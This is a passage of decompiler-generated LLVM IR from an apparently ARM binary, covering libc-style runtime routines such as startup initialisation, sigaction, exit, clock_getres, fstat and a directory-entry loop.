  store i32 1, i32* @global_var_17488.280, align 4
  store i32 4096, i32* @global_var_1747c.234, align 4
  ret i32 undef
}

define i32 @function_ce8c(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_ce8c:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %v4_ce90 = mul i32 %arg2, 4
  %v5_ce90 = add i32 %tmp, %v4_ce90
  %v2_ce94 = load i32, i32* %arg3, align 4
  %v2_ce98 = ptrtoint i32* %stack_var_-120 to i32
  %v1_ce9c = add i32 %v5_ce90, 4
  %v9_cea0 = icmp eq i32 %v1_ce9c, %v2_ce94
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg7, i32* @global_var_17474.285, align 4
  store i32 %v1_ce9c, i32* @global_var_17478.287, align 4
  store i32 %arg6, i32* @global_var_17484.275, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_cea0, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_ce8c
  store i32 %v5_ce90, i32* @global_var_17478.287, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_ce8c, %bb
  %v2_cee0 = bitcast i32* %stack_var_-120 to i8*
  %v3_cee0 = call i32 @function_be40(i8* %v2_cee0, i32 0)
  %storemerge.pre = load i32, i32* @global_var_17478.287, align 4
  br label %dec_label_pc_cef0

dec_label_pc_cef0:                                ; preds = %dec_label_pc_cef0, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_cef0, %dec_label_pc_cef0 ]
  %v1_cef0 = inttoptr i32 %storemerge to i32*
  %v2_cef0 = load i32, i32* %v1_cef0, align 4
  %v4_cef0 = add i32 %storemerge, 4
  %v2_cef4 = icmp eq i32 %v2_cef0, 0
  br i1 %v2_cef4, label %dec_label_pc_cf00, label %dec_label_pc_cef0

dec_label_pc_cf00:                                ; preds = %dec_label_pc_cef0
  store i32 %v4_cef0, i32* @r4, align 4
  %v1_cf2022 = inttoptr i32 %v4_cef0 to i32*
  %v2_cf2023 = load i32, i32* %v1_cf2022, align 4
  %v2_cf2425 = icmp eq i32 %v2_cf2023, 0
  br i1 %v2_cf2425, label %dec_label_pc_cf2c, label %dec_label_pc_cf08

dec_label_pc_cf08:                                ; preds = %dec_label_pc_cf00, %dec_label_pc_cf20
  %v5_cf0c = phi i32 [ %v2_cf20, %dec_label_pc_cf20 ], [ %v2_cf2023, %dec_label_pc_cf00 ]
  %v2_cf08 = icmp ugt i32 %v5_cf0c, 13
  %v7_cf08 = icmp eq i32 %v5_cf0c, 14
  %v2_cf0c = xor i1 %v2_cf08, true
  %v3_cf0c = or i1 %v7_cf08, %v2_cf0c
  br i1 %v3_cf0c, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_cf08
  %v6_cf0c = and i32 %v5_cf0c, 536870912
  %v7_cf0c = icmp ne i32 %v6_cf0c, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_cf08, %bb42
  %v1_cf18 = phi i1 [ %v2_cf08, %dec_label_pc_cf08 ], [ %v7_cf0c, %bb42 ]
  %v2_cf10 = xor i1 %v1_cf18, true
  %v3_cf10 = or i1 %v7_cf08, %v2_cf10
  br i1 %v3_cf10, label %bb44, label %dec_label_pc_cf20

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_cf20

dec_label_pc_cf20:                                ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_cf10, i32 ptrtoint (i32* @global_var_be20.289 to i32))
  %v0_cf1c = load i32, i32* @r4, align 4
  %v1_cf1c = add i32 %v0_cf1c, 8
  store i32 %v1_cf1c, i32* @r4, align 4
  %v1_cf20 = inttoptr i32 %v1_cf1c to i32*
  %v2_cf20 = load i32, i32* %v1_cf20, align 4
  %v2_cf24 = icmp eq i32 %v2_cf20, 0
  br i1 %v2_cf24, label %dec_label_pc_cf2c, label %dec_label_pc_cf08

dec_label_pc_cf2c:                                ; preds = %dec_label_pc_cf20, %dec_label_pc_cf00
  %v1_cf30 = call i32 @function_df48(i32 %v2_ce98)
  store i32 %v1_cf30, i32* @r0, align 4
  %v1_cf34 = call i32 @function_ce30(i32 %v1_cf30)
  store i32 %v1_cf34, i32* @r0, align 4
  %v2_cf40 = icmp eq i32 %tmp37, 0
  br i1 %v2_cf40, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_cf2c
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_cf2c, %bb45
  %v0_cf50 = phi i32 [ %tmp37, %dec_label_pc_cf2c ], [ 4096, %bb45 ]
  %v3_cf48 = icmp eq i32 %tmp36, -1
  %v8_cf48 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_1747c.234 to i32), i32* @r2, align 4
  store i32 %v0_cf50, i32* @global_var_1747c.234, align 4
  br i1 %v3_cf48, label %dec_label_pc_cf58, label %dec_label_pc_cf80

dec_label_pc_cf58:                                ; preds = %bb46
  %v0_cf58 = call i32 @function_d528()
  store i32 %v0_cf58, i32* @r0, align 4
  store i32 %v0_cf58, i32* @r4, align 4
  %v0_cf60 = call i32 @function_d4b8()
  %v0_cf64 = load i32, i32* @r4, align 4
  %v9_cf64 = icmp eq i32 %v0_cf64, %v0_cf60
  br i1 %v9_cf64, label %dec_label_pc_cf6c, label %dec_label_pc_cfa8

dec_label_pc_cf6c:                                ; preds = %dec_label_pc_cf58
  %v1_cf6c = call i32 @function_d4e4(i32 %v0_cf60)
  store i32 %v1_cf6c, i32* @r0, align 4
  store i32 %v1_cf6c, i32* @r4, align 4
  %v0_cf74 = call i32 @function_d48c()
  %v0_cf78 = load i32, i32* @r4, align 4
  %v9_cf78 = icmp eq i32 %v0_cf78, %v0_cf74
  br i1 %v9_cf78, label %dec_label_pc_cf80, label %dec_label_pc_cfa8

dec_label_pc_cf80:                                ; preds = %dec_label_pc_cf6c, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_cf48, label %dec_label_pc_d014, label %dec_label_pc_cf8c

dec_label_pc_cf8c:                                ; preds = %dec_label_pc_cf80
  %v9_cf90 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_cf90, label %dec_label_pc_cf98, label %dec_label_pc_cfa8

dec_label_pc_cf98:                                ; preds = %dec_label_pc_cf8c
  br label %dec_label_pc_cfa8

dec_label_pc_cfa8:                                ; preds = %dec_label_pc_cf98, %dec_label_pc_cf8c, %dec_label_pc_cf6c, %dec_label_pc_cf58
  %v2_cfb0 = call i32 @function_cdf8(i32 0, i32 32768)
  %v2_cfbc = call i32 @function_cdf8(i32 1, i32 32770)
  %v2_cfc8 = call i32 @function_cdf8(i32 2, i32 32770)
  br label %dec_label_pc_d014

dec_label_pc_d014:                                ; preds = %dec_label_pc_cfa8, %dec_label_pc_cf80
  %v0_cfd8 = load i32, i32* %r6.global-to-local, align 4
  %v1_cfd8 = inttoptr i32 %v0_cfd8 to i32*
  %v2_cfd8 = load i32, i32* %v1_cfd8, align 4
  store i32 %v2_cfd8, i32* bitcast (i32** @global_var_173fc.296 to i32*), align 4
  store i32 %arg5, i32* @global_var_17480.273, align 4
  %v2_d014 = icmp eq i32 %arg4, 0
  br i1 %v2_d014, label %dec_label_pc_d050, label %bb47

bb47:                                             ; preds = %dec_label_pc_d014
  br label %dec_label_pc_d050

dec_label_pc_d050:                                ; preds = %dec_label_pc_d014, %bb47
  call void @__pseudo_branch(i32 %arg4)
  %v1_d060 = call i32 @function_bdd4()
  %v2_d068 = inttoptr i32 %v1_d060 to i32*
  store i32 0, i32* %v2_d068, align 4
  %v0_d094 = load i32, i32* %r8.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_d0a0 = call i32 @function_c798(i32 %v0_d094)
  ret i32 %v1_d0a0

; uselistorder directives
  uselistorder i32 %v2_cf20, { 1, 0 }
  uselistorder i32 %v1_cf1c, { 1, 0 }
  uselistorder i1 %v2_cf08, { 1, 0 }
  uselistorder i32 %v4_cef0, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @function_c798, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_cdf8, { 2, 1, 0 }
  uselistorder i32 536870912, { 1, 0 }
  uselistorder i1 true, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 15, 12, 14, 13 }
  uselistorder label %dec_label_pc_d050, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_cf20, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_cf08, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @function_d0d8(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_d0d8:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_d0d8 = load i32, i32* @r4, align 4
  %v6_d0d8 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_d0dc = icmp eq i32* %arg2, null
  %v2_d0e0 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_d0dc, label %dec_label_pc_d14c, label %dec_label_pc_d0f0

dec_label_pc_d0f0:                                ; preds = %dec_label_pc_d0d8
  %v2_d0f4 = load i32, i32* %arg2, align 4
  %v4_d0f4 = add i32 %tmp, 4
  store i32 %v4_d0f4, i32* @r1, align 4
  %v2_d0f8 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_d0f8, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_d0f4, i32* %stack_var_-156, align 4
  %v3_d104 = call i32 @function_be20(i32 %v2_d0f8, i32 %v4_d0f4, i32 128)
  store i32 %v3_d104, i32* %r0.global-to-local, align 4
  %v0_d108 = load i32, i32* @r4, align 4
  %v1_d108 = add i32 %v0_d108, 132
  %v2_d108 = inttoptr i32 %v1_d108 to i32*
  %v3_d108 = load i32, i32* %v2_d108, align 4
  %v1_d10c = and i32 %v3_d108, 67108864
  %v2_d10c = icmp eq i32 %v1_d10c, 0
  br i1 %v2_d10c, label %dec_label_pc_d120, label %bb

bb:                                               ; preds = %dec_label_pc_d0f0
  br label %dec_label_pc_d13c

dec_label_pc_d120:                                ; preds = %dec_label_pc_d0f0
  %v1_d128 = and i32 %v3_d108, 4
  %v2_d128 = icmp eq i32 %v1_d128, 0
  br i1 %v2_d128, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_d120
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_d120, %bb20
  br label %dec_label_pc_d13c

dec_label_pc_d13c:                                ; preds = %bb, %bb21
  %v2_d13c = icmp eq i32 %v0_d108, 0
  %v3_d140 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_d140 = select i1 %v2_d13c, i32 0, i32 %v3_d140
  %v0_d14c.pre = load i32, i32* @r5, align 4
  %v0_d15c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d14c

dec_label_pc_d14c:                                ; preds = %dec_label_pc_d13c, %dec_label_pc_d0d8
  %v0_d15c = phi i32 [ %arg1, %dec_label_pc_d0d8 ], [ %v0_d15c.pre, %dec_label_pc_d13c ]
  %v0_d14c = phi i32 [ %arg3, %dec_label_pc_d0d8 ], [ %v0_d14c.pre, %dec_label_pc_d13c ]
  %storemerge = phi i32 [ 0, %dec_label_pc_d0d8 ], [ %.v3_d140, %dec_label_pc_d13c ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_d14c = icmp eq i32 %v0_d14c, 0
  %.v2_d0e0 = select i1 %v2_d14c, i32 0, i32 %v2_d0e0
  store i32 %.v2_d0e0, i32* @r2, align 4
  store i32 %v0_d15c, i32* %r0.global-to-local, align 4
  %v1_d160 = call i32 @function_d1c4(i32 %v0_d15c)
  store i32 %v1_d160, i32* %r0.global-to-local, align 4
  %v0_d164 = load i32, i32* @r5, align 4
  %v2_d164 = icmp eq i32 %v0_d164, 0
  br i1 %v2_d164, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_d14c
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_d14c, %bb25
  %v0_d174.pr = phi i32 [ 0, %dec_label_pc_d14c ], [ 1, %bb25 ]
  %v1_d16c = icmp slt i32 %v1_d160, 0
  br i1 %v1_d16c, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_d1a8

thread-pre-split:                                 ; preds = %bb26
  %v2_d174 = icmp eq i32 %v0_d174.pr, 0
  store i32 %v1_d160, i32* @r4, align 4
  br i1 %v2_d174, label %dec_label_pc_d1a8, label %dec_label_pc_d180

dec_label_pc_d180:                                ; preds = %thread-pre-split
  %v2_d180 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_d164, i32* %r0.global-to-local, align 4
  %v2_d188 = inttoptr i32 %v0_d164 to i32*
  store i32 %v2_d180, i32* %v2_d188, align 4
  %v3_d188 = load i32, i32* %r0.global-to-local, align 4
  %v4_d188 = add i32 %v3_d188, 4
  store i32 %v4_d188, i32* @r0, align 4
  %v2_d18c = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_d18c, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v3_d194 = call i32 @function_be20(i32 %v4_d188, i32 %v2_d18c, i32 128)
  store i32 %v3_d194, i32* %r0.global-to-local, align 4
  %v1_d19c = load i32, i32* @r5, align 4
  %v2_d19c = add i32 %v1_d19c, 136
  %v3_d19c = inttoptr i32 %v2_d19c to i32*
  %v1_d1a4 = load i32, i32* @r5, align 4
  %v2_d1a4 = add i32 %v1_d1a4, 132
  %v3_d1a4 = inttoptr i32 %v2_d1a4 to i32*
  %v0_d1a8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d1a8

dec_label_pc_d1a8:                                ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_d180
  %v0_d1a8 = phi i32 [ %v1_d160, %thread-pre-split ], [ %v0_d1a8.pre, %dec_label_pc_d180 ], [ %v1_d160, %thread-pre-split.thread ]
  store i32 %v0_d1a8, i32* %r0.global-to-local, align 4
  store i32 %v3_d0d8, i32* @r4, align 4
  store i32 %v6_d0d8, i32* @r5, align 4
  ret i32 %v0_d1a8

; uselistorder directives
  uselistorder i32 %v0_d1a8, { 1, 0 }
  uselistorder i32 %v0_d164, { 1, 0, 2 }
  uselistorder i32 %v0_d15c, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 1, 6, 7, 0 }
  uselistorder label %dec_label_pc_d1a8, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_d13c, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @function_d1c4(i32 %arg1) local_unnamed_addr {
dec_label_pc_d1c4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d1c4 = load i32, i32* @r4, align 4
  store i32 %v3_d1c4, i32* %stack_var_-8, align 4
  %v1_d1c8 = load i32, i32* @r1, align 4
  %v2_d1c8 = inttoptr i32 %v1_d1c8 to %sigaction*
  %v3_d1c8 = load i32, i32* @r2, align 4
  %v4_d1c8 = inttoptr i32 %v3_d1c8 to %sigaction*
  %v5_d1c8 = call i32 @sigaction(i32 %arg1, %sigaction* %v2_d1c8, %sigaction* %v4_d1c8)
  store i32 %v5_d1c8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_d1c8, -4095
  br i1 %tmp, label %dec_label_pc_d1e8, label %dec_label_pc_d1d8

dec_label_pc_d1d8:                                ; preds = %dec_label_pc_d1c4
  %v0_d1d8 = call i32 @function_bdd4()
  %v0_d1dc = load i32, i32* %r4.global-to-local, align 4
  %v1_d1dc = sub i32 0, %v0_d1dc
  %v2_d1e0 = inttoptr i32 %v0_d1d8 to i32*
  store i32 %v1_d1dc, i32* %v2_d1e0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d1e8

dec_label_pc_d1e8:                                ; preds = %dec_label_pc_d1c4, %dec_label_pc_d1d8
  %v0_d1e8 = phi i32 [ %v5_d1c8, %dec_label_pc_d1c4 ], [ -1, %dec_label_pc_d1d8 ]
  %v2_d1ec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d1ec, i32* %r4.global-to-local, align 4
  ret i32 %v0_d1e8

; uselistorder directives
  uselistorder i32 %v5_d1c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d1e8, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_d1f0(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_d1f0:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_d218(i32 %arg1, %timespec* %arg2) local_unnamed_addr {
dec_label_pc_d218:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d218 = load i32, i32* @r4, align 4
  store i32 %v3_d218, i32* %stack_var_-8, align 4
  %v4_d21c = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_d21c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_d21c, -4095
  br i1 %tmp, label %dec_label_pc_d23c, label %dec_label_pc_d22c

dec_label_pc_d22c:                                ; preds = %dec_label_pc_d218
  %v0_d22c = call i32 @function_bdd4()
  %v0_d230 = load i32, i32* %r4.global-to-local, align 4
  %v1_d230 = sub i32 0, %v0_d230
  %v2_d234 = inttoptr i32 %v0_d22c to i32*
  store i32 %v1_d230, i32* %v2_d234, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d23c

dec_label_pc_d23c:                                ; preds = %dec_label_pc_d218, %dec_label_pc_d22c
  %v0_d23c = phi i32 [ %v4_d21c, %dec_label_pc_d218 ], [ -1, %dec_label_pc_d22c ]
  %v2_d240 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d240, i32* %r4.global-to-local, align 4
  ret i32 %v0_d23c

; uselistorder directives
  uselistorder i32 %v4_d21c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d23c, { 1, 0 }
}

define i32 @function_d244() local_unnamed_addr {
dec_label_pc_d244:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %tmp4 = bitcast i32* %stack_var_-72 to %stat*
  %v0_d254 = load i32, i32* @r0, align 4
  %v4_d254 = call i32 @fstat(i32 %v0_d254, %stat* %tmp4)
  store i32 %v4_d254, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_d254, -4095
  br i1 %tmp, label %dec_label_pc_d278, label %dec_label_pc_d264

dec_label_pc_d264:                                ; preds = %dec_label_pc_d244
  %v0_d264 = call i32 @function_bdd4()
  %v0_d268 = load i32, i32* %r4.global-to-local, align 4
  %v1_d268 = sub i32 0, %v0_d268
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_d270 = inttoptr i32 %v0_d264 to i32*
  store i32 %v1_d268, i32* %v2_d270, align 4
  br label %dec_label_pc_d288

dec_label_pc_d278:                                ; preds = %dec_label_pc_d244
  %v2_d278 = icmp eq i32 %v4_d254, 0
  store i32 53896, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_d278, i32 ptrtoint (i32* @global_var_d9cc.307 to i32))
  br label %dec_label_pc_d288

dec_label_pc_d288:                                ; preds = %dec_label_pc_d264, %dec_label_pc_d278
  %v0_d288 = load i32, i32* %r4.global-to-local, align 4
  ret i32 %v0_d288

; uselistorder directives
  uselistorder i32 %v4_d254, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 2, 7, 5, 6, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_d288, { 1, 0 }
}

define i32 @function_d294(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d294:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %v6_d294 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_d29c = call i32 @function_d328()
  store i32 %v0_d29c, i32* %r6.global-to-local, align 4
  %tmp8 = icmp slt i32 %v0_d29c, 1
  br i1 %tmp8, label %dec_label_pc_d320, label %dec_label_pc_d30c.preheader

dec_label_pc_d30c.preheader:                      ; preds = %dec_label_pc_d294
  %v5_d2a4 = load i32, i32* @r4, align 4
  %v7_d2a4 = add i32 %v5_d2a4, %v0_d29c
  store i32 %v7_d2a4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d30c

dec_label_pc_d2b0:                                ; preds = %dec_label_pc_d30c
  %v1_d2b0 = add i32 %v2_d2c0, 16
  %v2_d2b0 = inttoptr i32 %v1_d2b0 to i32*
  %v3_d2b0 = load i32, i32* %v2_d2b0, align 4
  store i32 %v3_d2b0, i32* @lr, align 4
  %v2_d2b4 = inttoptr i32 %v1_d310 to i32*
  %v3_d2b4 = load i32, i32* %v2_d2b4, align 4
  store i32 %v3_d2b4, i32* %r2.global-to-local, align 4
  %v1_d2b8 = add i32 %v2_d2c0, 18
  %v2_d2b8 = inttoptr i32 %v1_d2b8 to i8*
  %v3_d2b8 = load i8, i8* %v2_d2b8, align 1
  %v4_d2b8 = zext i8 %v3_d2b8 to i32
  store i32 %v4_d2b8, i32* %ip.global-to-local, align 4
  %v3_d2bc = sdiv i32 %v3_d2b0, 256
  store i32 %v3_d2bc, i32* %r3.global-to-local, align 4
  %v1_d2c0 = trunc i32 %v3_d2b0 to i8
  %v4_d2c0 = inttoptr i32 %v1_d310 to i8*
  store i8 %v1_d2c0, i8* %v4_d2c0, align 1
  %v0_d2c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_d2c4 = load i32, i32* @r4, align 4
  %v2_d2c4 = add i32 %v1_d2c4, 4
  %v3_d2c4 = inttoptr i32 %v2_d2c4 to i32*
  store i32 %v0_d2c4, i32* %v3_d2c4, align 4
  %v0_d2c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_d2c8 = trunc i32 %v0_d2c8 to i8
  %v2_d2c8 = load i32, i32* @r4, align 4
  %v3_d2c8 = add i32 %v2_d2c8, 10
  %v4_d2c8 = inttoptr i32 %v3_d2c8 to i8*
  store i8 %v1_d2c8, i8* %v4_d2c8, align 1
  %v0_d2cc = load i32, i32* %r3.global-to-local, align 4
  %v1_d2cc = trunc i32 %v0_d2cc to i8
  %v2_d2cc = load i32, i32* @r4, align 4
  %v3_d2cc = add i32 %v2_d2cc, 9
  %v4_d2cc = inttoptr i32 %v3_d2cc to i8*
  store i8 %v1_d2cc, i8* %v4_d2cc, align 1
  %v0_d2d0 = load i32, i32* @r4, align 4
  %v1_d2d0 = add i32 %v0_d2d0, 8
  %v2_d2d0 = inttoptr i32 %v1_d2d0 to i8*
  %v3_d2d0 = load i8, i8* %v2_d2d0, align 1
  %v4_d2d0 = zext i8 %v3_d2d0 to i32
  store i32 %v4_d2d0, i32* %r2.global-to-local, align 4
  %v0_d2d4 = load i32, i32* @r5, align 4
  %v1_d2d4 = add i32 %v0_d2d4, 1
  %v2_d2d4 = inttoptr i32 %v1_d2d4 to i8*
  %v3_d2d4 = load i8, i8* %v2_d2d4, align 1
  %v4_d2d4 = zext i8 %v3_d2d4 to i32
  store i32 %v4_d2d4, i32* %r3.global-to-local, align 4
  %v4_d2d8 = mul nuw nsw i32 %v4_d2d4, 256
  %v5_d2d8 = or i32 %v4_d2d8, %v4_d2d0
  %v1_d2dc = add nsw i32 %v5_d2d8, -19
  store i32 %v1_d2dc, i32* @r2, align 4
  %v3_d2e0 = call i32 @function_be30(i32 %v1_d318, i32 %v1_d314, i32 %v1_d2dc)
  %v0_d2e4 = load i32, i32* @r4, align 4
  %v1_d2e4 = add i32 %v0_d2e4, 8
  %v2_d2e4 = inttoptr i32 %v1_d2e4 to i8*
  %v3_d2e4 = load i8, i8* %v2_d2e4, align 1
  %v4_d2e4 = zext i8 %v3_d2e4 to i32
  store i32 %v4_d2e4, i32* %r3.global-to-local, align 4
  %v0_d2e8 = load i32, i32* @r5, align 4
  %v1_d2e8 = add i32 %v0_d2e8, 1
  %v2_d2e8 = inttoptr i32 %v1_d2e8 to i8*
  %v3_d2e8 = load i8, i8* %v2_d2e8, align 1
  %v4_d2e8 = zext i8 %v3_d2e8 to i32
  store i32 %v0_d2e4, i32* @r0, align 4
  %v4_d2f0 = mul nuw nsw i32 %v4_d2e8, 256
  %v5_d2f0 = or i32 %v4_d2f0, %v4_d2e4
  store i32 %v5_d2f0, i32* @r2, align 4
  store i32 %v0_d2e4, i32* @r1, align 4
  %v3_d2f8 = call i32 @function_be30(i32 %v0_d2e4, i32 %v0_d2e4, i32 %v5_d2f0)
  %v0_d2fc = load i32, i32* @r4, align 4
  %v1_d2fc = add i32 %v0_d2fc, 8
  %v2_d2fc = inttoptr i32 %v1_d2fc to i8*
  %v3_d2fc = load i8, i8* %v2_d2fc, align 1
  %v4_d2fc = zext i8 %v3_d2fc to i32
  store i32 %v4_d2fc, i32* %r3.global-to-local, align 4
  %v0_d300 = load i32, i32* @r5, align 4
  %v1_d300 = add i32 %v0_d300, 1
  %v2_d300 = inttoptr i32 %v1_d300 to i8*
  %v3_d300 = load i8, i8* %v2_d300, align 1
  %v4_d300 = zext i8 %v3_d300 to i32
  store i32 %v4_d300, i32* @r2, align 4
  %v4_d304 = mul nuw nsw i32 %v4_d300, 256
  %v5_d304 = or i32 %v4_d304, %v4_d2fc
  store i32 %v5_d304, i32* %r3.global-to-local, align 4
  %v2_d308 = add i32 %v5_d304, %v0_d2fc
  store i32 %v2_d308, i32* @r4, align 4
  %v1_d30c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_d30c

dec_label_pc_d30c:                                ; preds = %dec_label_pc_d30c.preheader, %dec_label_pc_d2b0
  %v1_d30c = phi i32 [ %v7_d2a4, %dec_label_pc_d30c.preheader ], [ %v1_d30c.pre, %dec_label_pc_d2b0 ]
  %v2_d2c0 = phi i32 [ %v5_d2a4, %dec_label_pc_d30c.preheader ], [ %v2_d308, %dec_label_pc_d2b0 ]
  %v3_d30c = icmp ult i32 %v2_d2c0, %v1_d30c
  %v1_d310 = add i32 %v2_d2c0, 8
  store i32 %v1_d310, i32* @r5, align 4
  %v1_d314 = add i32 %v2_d2c0, 19
  store i32 %v1_d314, i32* @r1, align 4
  %v1_d318 = add i32 %v2_d2c0, 11
  store i32 %v1_d318, i32* @r0, align 4
  br i1 %v3_d30c, label %dec_label_pc_d2b0, label %dec_label_pc_d320.loopexit

dec_label_pc_d320.loopexit:                       ; preds = %dec_label_pc_d30c
  %v0_d320.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d320

dec_label_pc_d320:                                ; preds = %dec_label_pc_d294, %dec_label_pc_d320.loopexit
  %v0_d320 = phi i32 [ %v0_d320.pre, %dec_label_pc_d320.loopexit ], [ %v0_d29c, %dec_label_pc_d294 ]
  store i32 %v6_d294, i32* @r5, align 4
  ret i32 %v0_d320

; uselistorder directives
  uselistorder i32 %v1_d318, { 1, 0 }
  uselistorder i32 %v1_d314, { 1, 0 }
  uselistorder i32 %v1_d310, { 2, 1, 0 }
  uselistorder i32 %v2_d2c0, { 4, 3, 2, 5, 1, 0 }
  uselistorder i32 %v0_d2e4, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v3_d2b0, { 1, 0, 2 }
  uselistorder i32 %v5_d2a4, { 1, 0 }
  uselistorder i32 %v0_d29c, { 1, 0, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @function_be30, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_d320, { 1, 0 }
  uselistorder label %dec_label_pc_d30c, { 1, 0 }
}

define i32 @function_d328() local_unnamed_addr {
dec_label_pc_d328:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_d32c = load i32, i32* @r4, align 4
  %v9_d32c = load i32, i32* @r6, align 4
  %v0_d330 = load i32, i32* @r2, align 4
  %v1_d330 = add i32 %v0_d330, 6
  %v2_d338 = ptrtoint i32* %stack_var_-60 to i32
  %v1_d33c = and i32 %v1_d330, -4
  store i32 %v1_d33c, i32* %r3.global-to-local, align 4
  %v2_d340 = sub i32 %v2_d338, %v1_d33c
  %v0_d344 = load i32, i32* @r1, align 4
